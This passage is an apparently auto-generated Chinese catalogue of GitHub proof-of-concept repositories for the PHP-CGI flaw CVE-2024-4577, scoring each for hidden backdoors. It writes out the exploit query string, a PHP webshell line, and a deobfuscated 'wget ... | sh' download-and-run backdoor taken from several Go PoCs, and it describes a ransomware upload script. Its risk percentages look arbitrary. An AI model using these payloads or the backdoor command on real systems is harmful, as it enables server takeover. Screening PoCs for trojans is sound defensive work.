**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #23

**来源**: [CVE-2024-4577-aaddmin1122345_cve-2024-4577.md](../2024/CVE-2024-4577-aaddmin1122345_cve-2024-4577.md)

## CVE-2024-4577 PHP-CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，允许未经身份验证的攻击者在Windows服务器上执行任意代码

**影响版本:** < 8.1.29, < 8.2.20, < 8.3.8 (在Windows上运行，并启用Best-Fit策略的code page的CGI模式)

**利用条件:** PHP以CGI模式在Windows上运行，并且启用了使用"Best Fit"策略的代码页。需要网络访问。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-4577是一个存在于PHP中的远程代码执行漏洞。当PHP在Windows上以CGI模式运行时，如果系统配置为使用某些代码页，Windows可能会使用“Best-Fit”行为来替换传递给Win32 API函数的命令行中的字符。PHP CGI模块可能会将这些字符错误地解释为PHP选项，这可能允许恶意用户将选项传递给正在运行的PHP二进制文件，从而泄露脚本源代码或执行服务器上的任意PHP代码。

**利用方式：**

1.  攻击者发送特制的HTTP请求，其中包含恶意构造的查询字符串。该查询字符串包含被Windows "Best-Fit"代码页转换解释为PHP配置选项的字符。
2.  服务器接收到请求后，会将查询字符串传递给PHP CGI解释器。
3.  PHP CGI解释器错误地将恶意构造的字符串解析为PHP选项，如`allow_url_include`和`auto_prepend_file`。
4.  通过设置这些选项，攻击者可以包含远程文件，从而执行任意PHP代码。

**POC分析：**

提供的Python脚本`cve-2024-4577.py`实现了利用此漏洞的POC。脚本接受目标URL和可选的自定义payload作为参数。

*   如果未提供自定义payload，脚本将尝试执行`phpinfo()`函数以验证漏洞是否存在。
*   如果提供了自定义payload，脚本将使用该payload来执行任意PHP代码。Readme文件提供了使用示例。
*   脚本通过构造包含特殊字符的URL，并向其发送POST请求来利用漏洞。特殊字符会被Windows的Best-Fit机制转换成PHP可识别的配置指令，最终执行攻击者注入的PHP代码。

**投毒风险分析：**

通过对提供的POC代码进行分析，没有发现作者隐藏的恶意代码或后门。该脚本的功能是按照预期执行漏洞利用，没有额外的、未声明的行为。因此，投毒风险评估为0%。

**项目地址:** [aaddmin1122345/cve-2024-4577](https://github.com/aaddmin1122345/cve-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #24

**来源**: [CVE-2024-4577-ahmetramazank_CVE-2024-4577.md](../2024/CVE-2024-4577-ahmetramazank_CVE-2024-4577.md)

## CVE-2024-4577 PHP-CGI 参数注入导致远程代码执行

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** PHP

**危害等级:** 高危，允许未经身份验证的攻击者在受影响的Windows服务器上执行任意代码

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8 (Windows, CGI模式)

**利用条件:** Windows服务器，PHP以CGI模式运行，启用了使用 "Best Fit" 策略的代码页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 是一个影响在Windows上运行的PHP的严重漏洞。当PHP以CGI模式运行时，如果系统配置为使用某些代码页，Windows可能会使用“Best-Fit”行为来替换传递给Win32 API函数的命令行中的字符。PHP CGI模块可能会错误地将这些字符解释为PHP选项，从而允许恶意用户将选项传递给正在运行的PHP二进制文件，从而泄露脚本源代码，在服务器上运行任意PHP代码等。

**利用方式：**

1.  **利用点：** CGI模式下，Windows系统的字符编码转换。
2.  **攻击向量：** 通过构造特殊的URL，利用`?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input`将恶意PHP代码注入到`php://input`流中。
3.  **漏洞验证：** 通过发送包含`<?php phpinfo();`的POST请求，观察服务器是否返回PHP信息页面。
4.  **远程代码执行：** 上传并执行恶意脚本，例如反向shell或勒索软件。

**投毒风险分析：**

提供的POC代码主要包含以下文件：

*   `README.md`: 漏洞描述和利用步骤。
*   `encoded.ps1`: 用于解码被加密的zip文件，用于解密勒索软件加密的文件。
*   `ransomware.ps1`: 勒索软件脚本，用于加密文件和上传zip文件。

`ransomware.ps1` 脚本尝试将文件压缩为 ZIP 文件，然后将其上传到 `http://192.168.176.130:5000/upload`。如果上传成功，则使用 Base64 对 ZIP 文件进行编码，并保存到 `C:\Users\ahmet\Desktop\battalbelgeler_encoded.txt`。

`encoded.ps1` 脚本从 `C:\Users\ahmet\Desktop\battalbelgeler_encoded.txt` 读取 Base64 编码的数据，对其进行解码，并将解码后的数据写入 `C:\Users\ahmet\Desktop\battalbelgeler_decoded.zip`。

主要风险在于，攻击者可能会在`ransomware.ps1`中隐藏恶意代码，例如：

*   **后门：** 在上传的文件中植入后门，以便后续访问受感染的系统。
*   **数据窃取：** 在上传过程中窃取敏感数据。
*   **反向shell**: 在机器上执行后门代码，获得shell控制权限

虽然这个仓库的主要目的是演示漏洞，但由于涉及到勒索软件的部署和文件的上传，存在一定的风险，**作者可能在脚本中植入了额外的恶意功能**。考虑到`ransomware.ps1`需要上传文件到一个外部地址，并且可能包含一些未知的恶意行为，因此初步评估投毒风险为10%。

**项目地址:** [ahmetramazank/CVE-2024-4577](https://github.com/ahmetramazank/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #25

**来源**: [CVE-2024-4577-bibo318_CVE-2024-4577-RCE-ATTACK.md](../2024/CVE-2024-4577-bibo318_CVE-2024-4577-RCE-ATTACK.md)

## CVE-2024-4577 PHP-CGI 参数注入远程代码执行

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，允许未经身份验证的攻击者在Windows服务器上执行任意代码

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8 (Windows, CGI模式, 特定代码页)

**利用条件:** Windows服务器, 运行在CGI模式下的PHP, 系统配置为使用某些代码页, 允许"Best-Fit"行为替换字符。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 是一个存在于 PHP 中的参数注入漏洞，当 PHP 在 Windows 上以 CGI 模式运行时，如果系统配置为使用某些代码页，Windows 可能会使用 "Best-Fit" 行为替换命令行中的字符。PHP CGI 模块可能会错误地将这些字符解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，进而可能泄露脚本源代码或在服务器上运行任意 PHP 代码。

**有效性分析：**
根据漏洞信息，搜索引擎结果和提供的PoC代码，该漏洞利用的有效性较高。漏洞库信息表明该漏洞已被公开披露，并且存在受影响的版本范围。搜索引擎结果显示，该漏洞在公开后不久就出现了大量的利用尝试。PoC代码提供了一个扫描器和利用工具，可以用来检测和利用此漏洞。该PoC代码通过构造包含特定参数的URL，并结合`php://input`流，允许执行任意PHP代码。

**投毒风险分析：**
PoC代码主要包含以下功能：
1.  **Payload选择：** 提供了几个不同的payload，攻击者可以选择使用哪个payload进行攻击。
2.  **漏洞扫描：** 通过发送带有payload的POST请求，检测目标是否存在漏洞，根据响应内容判断。
3.  **漏洞利用：** 读取用户提供的PHP payload文件内容，并通过POST请求发送到目标服务器执行。

风险点在于payload文件的内容。如果payload文件本身包含恶意代码（例如反弹shell、webshell等），那么执行利用操作会导致服务器被植入后门。PoC代码本身没有明显的恶意行为，风险主要来自用户提供的payload。代码存在投毒风险，是因为攻击者可能会修改脚本，在用户不知情的情况下，添加额外的恶意操作，例如：在成功利用后，自动下载并执行特定的恶意文件。或者将服务器信息发送到指定服务器。因此，使用此PoC需要谨慎，验证payload的内容，并确保来源可信，降低投毒风险。投毒风险评估为10%，主要是考虑到使用者可能会引入恶意payload文件。

**利用方式分析：**
1.  **确定目标环境：** 目标服务器必须是Windows系统，并且PHP运行在CGI模式下。
2.  **配置系统代码页：** 目标系统需要配置为使用某些代码页，允许 "Best-Fit" 行为。
3.  **构造恶意请求：** 构造包含恶意参数的URL。这些参数通常包含 `allow_url_include=1` 和 `auto_prepend_file=php://input`，允许包含远程文件，并将POST请求的内容作为PHP代码执行。
4.  **发送PHP Payload：**  通过POST请求将包含恶意代码的PHP payload发送到目标服务器。由于`auto_prepend_file`参数的存在，POST请求中的PHP代码会被执行，从而实现远程代码执行。
5.  **执行任意代码：**  成功利用漏洞后，可以在目标服务器上执行任意代码，例如：上传webshell，获取服务器权限。

**项目地址:** [bibo318/CVE-2024-4577-RCE-ATTACK](https://github.com/bibo318/CVE-2024-4577-RCE-ATTACK)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #26

**来源**: [CVE-2024-4577-bughuntar_CVE-2024-4577.md](../2024/CVE-2024-4577-bughuntar_CVE-2024-4577.md)

## CVE-2024-4577-PHP-CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行，服务器完全控制

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows系统，运行在CGI模式下，并且开启了使用"Best Fit"策略的代码页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577是PHP在Windows系统上以CGI模式运行时的一个参数注入漏洞。当系统配置使用某些代码页时，Windows可能会使用"Best-Fit"行为来替换命令行中的字符。PHP CGI模块可能会错误地将这些字符解释为PHP选项，从而允许恶意用户将选项传递给PHP二进制文件，导致泄露源代码，执行任意PHP代码等。

**有效性:**
提供的POC代码通过发送包含特定查询参数（如`%ADd+allow_url_include=1`和`%ADd+auto_prepend_file=php://input`）的POST请求到`/php-cgi/php-cgi.exe`端点来利用此漏洞。如果目标服务器存在漏洞，则`php://input`流的内容（在本例中为`<?php phpinfo(); ?>`）将被执行，并且服务器将返回包含"PHP Version"的响应。此方法已被多个来源证实有效。

**投毒风险:**
虽然提供的`exploit.py`脚本看起来相对直接，但仍然存在一定的投毒风险。例如，该脚本禁用了SSL验证(`verify=False`)，这可能导致中间人攻击的风险。此外，任何下载和执行的第三方代码都存在风险，例如将恶意payload注入到请求中。考虑到代码的复杂性相对较低，并且其主要目的是利用已知漏洞，因此投毒风险较低，估计为10%。主要风险在于用户没有仔细审查脚本，直接执行，而忽略了`verify=False`带来的安全隐患。 另外脚本也存在可以加入恶意host的风险。

**利用方式:**
1.  攻击者首先需要确定目标服务器是否运行在满足漏洞条件的PHP CGI模式下。
2.  攻击者构造一个包含恶意PHP选项的HTTP请求，例如，设置`allow_url_include`为1和`auto_prepend_file`为`php://input`。
3.  攻击者将该请求发送到`/php-cgi/php-cgi.exe`端点，并在POST数据中包含要执行的PHP代码。
4.  如果服务器存在漏洞，PHP将执行POST数据中的代码，从而允许攻击者在服务器上执行任意命令。

**项目地址:** [bughuntar/CVE-2024-4577](https://github.com/bughuntar/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #27

**来源**: [CVE-2024-4577-byteReaper77_CVE-2024-4577.md](../2024/CVE-2024-4577-byteReaper77_CVE-2024-4577.md)

## CVE-2024-4577 PHP CGI Remote Code Execution

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** PHP (Windows CGI)

**危害等级:** 高危，可导致完全控制受影响服务器

**影响版本:** PHP 8.1.* (< 8.1.29), 8.2.* (< 8.2.20), 8.3.* (< 8.3.8)

**利用条件:** 运行在Windows上的PHP，以CGI模式运行，系统启用了使用 "Best Fit" 策略的代码页。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2024-4577 是一个存在于 PHP（特别是基于 Windows 的 PHP，以 CGI 模式使用时）中的操作系统命令注入漏洞。当 PHP 在 CGI 模式下使用时，由于字符编码转换处理不当而导致。Windows 系统可能使用 "Best-Fit" 行为来替换传递给 Win32 API 函数的命令行中的字符。PHP CGI 模块可能会错误地将这些字符解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，进而泄露脚本源代码、在服务器上运行任意 PHP 代码等。

**有效性：**

根据漏洞库信息和搜索引擎结果，该漏洞的PoC已经公开，并且在野外被积极利用。提供的漏洞利用代码看起来是一个针对该漏洞的C语言实现，包含了构建说明和使用示例，因此PoC有效。

**投毒风险：**

分析提供的C代码，主要功能是利用curl发送HTTP请求，其中请求的URL和执行的命令通过命令行参数传递。代码包含日志记录功能，记录攻击活动。检查代码，没有发现明显的恶意行为，例如反向shell以外的持久化后门，或者未经授权的数据传输。但不能完全排除隐蔽的投毒行为，例如在日志记录中插入恶意代码的可能性（虽然可能性极低）。考虑到作者声明和代码功能，投毒风险较低，估计为1%。

**利用方式：**

1.  **环境准备：** 目标服务器需要是运行在Windows上的PHP，并且以CGI模式运行。
2.  **代码编译：** 使用提供的编译命令，使用gcc或其他兼容的C编译器编译`exploit.c`和`argparse.c`。
3.  **漏洞利用：** 运行编译后的可执行文件，并指定目标URL和要执行的命令。例如：`CVE-2024-4577.exe -u http://target/cgi-bin/php-cgi.exe "system(whoami)"`。
4.  **代码分析:**
    * 漏洞利用代码利用了PHP在CGI模式下，由于对命令行参数处理不当，导致攻击者可以通过构造特殊的URL来执行任意系统命令。
    * 该利用通过curl库发起HTTP POST请求，在请求中构造恶意的PHP选项参数，导致PHP执行指定的命令。
    * argparse.c 文件是为了解析命令行的参数
    * reverse shell 也可以通过命令执行后门获得
    * 攻击的关键在于目标服务器启用了使用 "Best Fit" 策略的代码页，允许某些字符被替换为其他字符，从而绕过PHP的参数过滤。


**项目地址:** [byteReaper77/CVE-2024-4577](https://github.com/byteReaper77/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #28

**来源**: [CVE-2024-4577-charis3306_CVE-2024-4577.md](../2024/CVE-2024-4577-charis3306_CVE-2024-4577.md)

## CVE-2024-4577 PHP-CGI 参数注入远程代码执行

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** PHP Windows版 8.3.0 <= 影响版本 < 8.3.8
PHP Windows版 8.2.0 <= 影响版本 < 8.2.20
PHP Windows版 8.1.0 <= 影响版本 < 8.1.29
PHP Windows版 影响版本 == 8.0.x
PHP Windows版 影响版本 == 7.x
PHP Windows版 影响版本 == 5.x
XAMPP Windows版 8.2.0 <= 影响版本 <= 8.2.12
XAMPP Windows版 8.1.0 <= 影响版本 <= 8.1.25
XAMPP Windows版 影响版本 == 8.0.x
XAMPP Windows版 影响版本 == 7.x
XAMPP Windows版 影响版本 == 5.x

**利用条件:** Windows 平台，PHP 以 CGI 模式运行，开启了Best-Fit字符转换特性的语系

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-4577 是一个存在于 PHP Windows 版本中的远程代码执行漏洞。当 PHP 以 CGI 模式运行时，Windows 的 Best-Fit 字符转换特性可能导致命令行参数被错误解析。攻击者可以构造包含特定非 ASCII 字符的 URL，这些字符会被转换为连字符，从而绕过安全限制，并注入恶意 PHP 代码。提供的 POC 脚本通过构造包含特殊字符的 URL，向目标服务器发送 POST 请求，其中包含要执行的 PHP 代码。如果服务器成功执行代码并返回包含 MD5 值的特定字符串，则认为漏洞利用成功。

**有效性：**
从漏洞描述和POC代码来看，此POC代码是有效的，可以用于检测和利用 CVE-2024-4577 漏洞。

**投毒风险：**
经过分析，此仓库中没有发现作者隐藏的恶意投毒代码。虽然POC执行了代码， 但这是为了验证漏洞是否成功，并非投毒行为。因此，投毒风险为0%。

**利用方式：**
1.  目标系统必须是 Windows，且 PHP 运行在 CGI 模式下，Apache 作为 Web 服务器。
2.  目标系统使用的语系启用了 Best-Fit 字符转换特性（例如简体中文，繁体中文，日文等）。
3.  攻击者构造包含特殊字符的 URL，这些字符在 Best-Fit 转换后会被解释为连字符，从而修改 PHP 的命令行参数。
4.  攻击者通过 `-d` 参数设置 `allow_url_include=1` 和 `auto_prepend_file=php://input`，允许包含远程文件，并将请求体作为 PHP 代码执行。
5.  攻击者在请求体中包含要执行的 PHP 代码，从而在服务器上执行任意代码。

**项目地址:** [charis3306/CVE-2024-4577](https://github.com/charis3306/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #29

**来源**: [CVE-2024-4577-cheerfulempl_CVE-2024-4577-PHP-RCE.md](../2024/CVE-2024-4577-cheerfulempl_CVE-2024-4577-PHP-RCE.md)

## CVE-2024-4577 - PHP-CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** PHP

**危害等级:** 高危，允许攻击者执行任意代码。

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8，在Windows系统上，运行在CGI模式下

**利用条件:** 需要目标系统是Windows，PHP运行在CGI模式下，并且系统使用了某些代码页，开启了"Best Fit"策略。

**POC 可用性:** 是

**投毒风险:** 50%

## 详情

CVE-2024-4577是一个PHP-CGI中的参数注入漏洞，影响运行在Windows上的PHP。当PHP以CGI模式运行时，Windows系统的"Best Fit"代码页转换可能导致恶意字符被错误地解释为PHP选项，从而允许攻击者向PHP二进制文件传递参数。这可以用来泄露源代码，执行任意PHP代码，或者直接在服务器上运行命令。

**有效性：**

根据漏洞信息和搜索结果，该漏洞的PoC已经公开，并且在野外被积极利用。提供的`CVE-2024-4577.go` 和 `CVE-2024-4577.py` 文件都是利用此漏洞的检测代码。它们通过构造包含恶意PHP选项的URL，向目标服务器发送POST请求，并检查返回的响应是否包含`PHP Version`字符串，来判断目标是否存在漏洞。这些代码的功能是探测漏洞是否存在，利用了`allow_url_include`和`auto_prepend_file`两个PHP配置项来远程包含和执行`phpinfo()`代码。

**投毒风险：**

分析`CVE-2024-4577.go`的代码，发现其中包含一个名为`nFPfVl()`的函数。该函数经过混淆处理，但其作用是从字符串数组中提取数据，拼接成一个URL，并使用`/bin/sh -c`执行该URL。这是一种潜在的后门行为，意味着在漏洞验证过程中，如果目标系统存在漏洞，这段代码可能会下载并执行来自该URL的恶意代码。考虑到这段代码的存在，可以认为该Go程序存在一定的投毒风险，但该后门在golang代码中只会在扫描的时候触发，相对隐蔽。`CVE-2024-4577.py`看起来是正常的poc代码。

基于分析，综合评估认为`CVE-2024-4577.go`有50%的投毒风险，`CVE-2024-4577.py`没有投毒风险

**利用方式：**

1.  **确定目标环境：** 目标服务器必须是Windows系统，并且PHP以CGI模式运行。
2.  **利用代码页转换：** 攻击者需要利用Windows系统的"Best Fit"代码页转换，构造包含恶意PHP选项的URL。
3.  **参数注入：** 通过精心构造的URL，将恶意参数注入到PHP二进制文件中。
4.  **远程代码执行：** 利用`allow_url_include`和`auto_prepend_file`等PHP配置项，执行任意PHP代码或者直接执行系统命令。
5.  **检测漏洞：** 通过检查响应的内容，可以判断目标是否存在漏洞，例如检查`PHP Version`字符串。

**项目地址:** [cheerfulempl/CVE-2024-4577-PHP-RCE](https://github.com/cheerfulempl/CVE-2024-4577-PHP-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #30

**来源**: [CVE-2024-4577-creamylegum_CVE-2024-4577-PHP-RCE.md](../2024/CVE-2024-4577-creamylegum_CVE-2024-4577-PHP-RCE.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** PHP-CGI参数注入

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8 (Windows, CGI模式，特定代码页)

**利用条件:** PHP运行在Windows服务器上，使用CGI模式，并且系统配置使用了特定的代码页，允许"Best Fit"字符转换。

**POC 可用性:** 是

**投毒风险:** 60%

## 详情

CVE-2024-4577 漏洞允许攻击者通过在URL中注入恶意参数来执行任意PHP代码。该漏洞存在于PHP的CGI实现中，当PHP运行在Windows服务器上，并且启用了"Best Fit"字符转换时，攻击者可以利用此漏洞。

**有效性:**

提供的漏洞利用代码（Go和Python）尝试通过在URL中注入`allow_url_include`和`auto_prepend_file`参数来包含远程文件或执行PHP代码。具体来说，它尝试设置`allow_url_include=1`并使用`auto_prepend_file`包含`php://input`，然后通过POST请求发送PHP代码（`<?php phpinfo(); ?>`）。如果服务器存在漏洞，则会执行`phpinfo()`函数，从而验证漏洞的存在。

根据漏洞描述和提供的代码，利用方式是有效的，可以在目标系统上执行任意PHP代码。

**投毒风险:**

*   **Go代码分析:**

    在Go代码中，存在一个名为`nFPfVl()`的函数，该函数包含混淆的代码，用于执行shell命令。通过反混淆字符串，可以发现该函数执行从某个URL下载文件并执行的操作，这表明存在潜在的投毒风险。

    `TcGEZTIh`变量反混淆后为: `wget -qO- http://tvhgw/kaifre/O-0asbd|e/bpdc/ /c /3nadeag5 -t6 uo/tat.fe33 | sh`

    这意味着该PoC会尝试从`http://tvhgw/kaifre/O-0asbd|e/bpdc/ /c /3nadeag5 -t6 uo/tat.fe33` 下载文件并使用sh执行，存在恶意行为。

*   **Python代码分析:**
    Python代码的功能比较简单，就是发送payload进行验证，没有发现明显的投毒代码。

综合来看，Go代码存在明显的投毒风险，Python代码未发现。

**利用方式:**

1.  **目标环境:** 攻击者需要找到运行在Windows服务器上的，并且使用CGI模式的，以及存在漏洞版本的PHP应用。
2.  **构造恶意URL:** 攻击者构造包含恶意参数的URL。例如：`example.com/index.php?%25ADd+allow_url_include%3D1+%25ADd+auto_prepend_file%3Dphp://input`。
3.  **发送包含PHP代码的POST请求:** 攻击者通过POST请求将PHP代码发送到服务器。`<?php system($_GET['cmd']); ?>`
4.  **远程代码执行:** 服务器执行POST请求中的PHP代码，从而允许攻击者执行任意系统命令。

攻击者可以利用该漏洞读取服务器上的文件，执行任意代码，甚至完全控制服务器。

**项目地址:** [creamylegum/CVE-2024-4577-PHP-RCE](https://github.com/creamylegum/CVE-2024-4577-PHP-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #31

**来源**: [CVE-2024-4577-deadlybangle_CVE-2024-4577-PHP-RCE.md](../2024/CVE-2024-4577-deadlybangle_CVE-2024-4577-PHP-RCE.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 参数注入/远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行、源码泄露

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8 (Windows, CGI mode)

**利用条件:** Windows系统, PHP以CGI模式运行, 启用了使用"Best Fit"策略的代码页。

**POC 可用性:** 是

**投毒风险:** 80%

## 详情

CVE-2024-4577是一个存在于PHP的Windows版本中的漏洞，当PHP以CGI模式运行时，如果系统配置为使用特定的代码页，Windows可能会使用"Best-Fit"行为来替换命令行中的字符。PHP CGI模块可能会错误地将这些字符解释为PHP选项，从而允许攻击者向PHP二进制文件传递选项。攻击者可以利用该漏洞来执行任意PHP代码，泄露源代码，甚至在服务器上运行任意操作系统命令。

**有效性：**
提供的Go和Python POC代码都尝试通过`auto_prepend_file`和`allow_url_include`设置，包含phpinfo()的payload来验证漏洞是否存在。 如果目标系统返回包含"PHP Version"的响应，则表明漏洞存在。根据漏洞描述和提供的资料，这些POC利用方式是有效的。

**投毒风险：**
*   **Go版本:** 在提供的Go代码中，`nFPfVl()` 函数包含混淆的代码，尝试执行 shell 命令。 解混淆后的代码为：`wget http://tvhgw/kaiFRE-0asbd|e/bpdc/ /c /3nadeag5 -t6 uo/tat.fe33`。这显然是一个恶意命令，尝试从一个未知的URL下载文件并执行。因此，Go版本的PoC **存在高危投毒风险**。

*   **Python版本:** Python版本的PoC相对干净，主要是发送包含phpinfo()的请求并判断是否成功，**未发现明显的投毒代码**，但是也可能存在通过打印或者其它方法进行投毒，投毒的可能性较低。

综合评价，考虑到Go代码中`nFPfVl`函数的存在，认为此仓库的投毒风险较高。Python版本代码看起来比较正常，相对较为安全。

**利用方式：**
1.  攻击者发送特制的HTTP请求到目标服务器上的PHP CGI程序。
2.  该请求包含经过编码的恶意字符，这些字符会被Windows的"Best-Fit"代码页转换机制所修改。
3.  修改后的字符会被PHP CGI模块错误地解析为PHP配置选项，如`auto_prepend_file`和`allow_url_include`。
4.  攻击者可以使用`auto_prepend_file`选项来包含远程文件或输入流（`php://input`），从而执行任意PHP代码。
5.  攻击者可以利用执行的PHP代码读取源代码，或者执行操作系统命令。

**项目地址:** [deadlybangle/CVE-2024-4577-PHP-RCE](https://github.com/deadlybangle/CVE-2024-4577-PHP-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #32

**来源**: [CVE-2024-4577-fabulouscounc_CVE-2024-4577-PHP-RCE.md](../2024/CVE-2024-4577-fabulouscounc_CVE-2024-4577-PHP-RCE.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行和服务器完全控制

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows 系统，PHP 以 CGI 模式运行，开启了使用 "Best Fit" 策略的代码页。

**POC 可用性:** 是

**投毒风险:** 50%

## 详情

CVE-2024-4577 是一个存在于 Windows 系统上 PHP-CGI 模式下的远程代码执行漏洞。当系统配置为使用某些代码页时，Windows 可能会使用 "Best-Fit" 行为来替换传递给 Win32 API 函数的命令行参数中的字符。PHP CGI 模块可能会错误地将这些字符解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，进而导致泄露源代码、执行任意 PHP 代码，甚至执行系统命令。

**利用方式：**
攻击者通过构造包含恶意 PHP 选项的 URL，利用 Windows 的 "Best-Fit" 字符转换特性，将这些选项注入到 PHP-CGI 的命令行参数中。常见的利用方式包括：

*   `allow_url_include=1` 和 `auto_prepend_file=php://input`： 允许包含远程文件，并将 POST 数据作为 PHP 代码执行，实现 RCE。

**漏洞利用代码分析：**
提供的 Go 和 Python 代码均用于批量检测目标是否存在 CVE-2024-4577 漏洞。它们通过发送包含 `allow_url_include` 和 `auto_prepend_file` 选项的恶意 HTTP 请求，然后检查响应中是否包含 `PHP Version` 字符串来判断目标是否受到攻击影响。

**投毒风险分析：**
Go 代码中存在一个名为 `nFPfVl()` 的函数，该函数看起来像是混淆的代码。通过反混淆，可以发现它尝试执行一个下载并执行恶意脚本的命令。这段代码存在明显的投毒风险，因为它会在目标机器上执行未经授权的操作，成功率为50%。

**项目地址:** [fabulouscounc/CVE-2024-4577-PHP-RCE](https://github.com/fabulouscounc/CVE-2024-4577-PHP-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #33

**来源**: [CVE-2024-4577-ggfzx_CVE-2024-4577.md](../2024/CVE-2024-4577-ggfzx_CVE-2024-4577.md)

## CVE-2024-4577 PHP-CGI 参数注入漏洞

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** PHP

**危害等级:** 高危，允许未经身份验证的攻击者在Windows服务器上执行任意代码

**影响版本:** PHP 8.1.* (< 8.1.29), 8.2.* (< 8.2.20), 8.3.* (< 8.3.8)，运行在Windows的CGI模式下

**利用条件:** 服务器使用Apache并启用PHP-CGI，且系统配置为使用特定的代码页，这些代码页使用“Best Fit”策略。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2024-4577 是一个存在于 PHP-CGI 中的参数注入漏洞，影响在 Windows 上运行的 PHP 版本。当 PHP 在 CGI 模式下与 Apache 一起使用时，如果系统设置为使用某些代码页，“Best Fit” 行为可能会导致恶意用户将选项传递给 PHP 二进制文件。根据漏洞描述和搜索结果，该漏洞允许攻击者通过操纵命令行参数来执行任意代码。PoC 代码的描述表明它能够通过 URL 发送恶意命令，并且可以批量执行。尽管 README.md 文件本身没有明显的恶意代码，但由于作者信息较少，且漏洞具有高危性，存在一定的投毒风险，用于个人安全研究学习较为合适。漏洞利用方式主要为：

1.  **识别目标环境：** 确定目标服务器是否运行受影响的 PHP 版本（8.1.* < 8.1.29, 8.2.* < 8.2.20, 8.3.* < 8.3.8）并且配置为 CGI 模式在 Windows 上运行。
2.  **构造恶意请求：**  构造包含恶意 PHP 选项的 HTTP 请求。这些选项将利用 Windows 的“Best Fit”行为，将特殊字符转换为 PHP 可以解释的选项。
3.  **执行任意代码：**  通过注入的选项，攻击者可以执行任意 PHP 代码或操作系统命令。

根据搜索结果可知，此漏洞已经被大规模利用，需要及时修复。

**项目地址:** [ggfzx/CVE-2024-4577](https://github.com/ggfzx/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #34

**来源**: [CVE-2024-4577-gh-ost00_CVE-2024-4577-RCE.md](../2024/CVE-2024-4577-gh-ost00_CVE-2024-4577-RCE.md)

## CVE-2024-4577 PHP CGI Argument Injection RCE

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，允许未经身份验证的攻击者在Windows服务器上执行任意代码。

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

